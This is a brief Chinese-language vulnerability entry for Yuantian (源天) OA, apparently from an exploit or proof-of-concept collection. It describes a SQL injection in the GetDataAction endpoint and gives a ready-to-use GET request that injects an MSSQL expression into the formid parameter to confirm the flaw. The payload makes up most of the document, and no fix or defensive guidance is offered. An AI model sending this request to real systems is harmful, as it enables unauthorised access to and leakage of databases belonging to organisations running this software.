**漏洞描述：**

源天OA GetDataAction 接口存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库中的数据，造成信息泄漏。

**影响版本：**

源天OA

**Payload：**

```sql
GET /ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20AND%20%27a%27=%27a

```

---
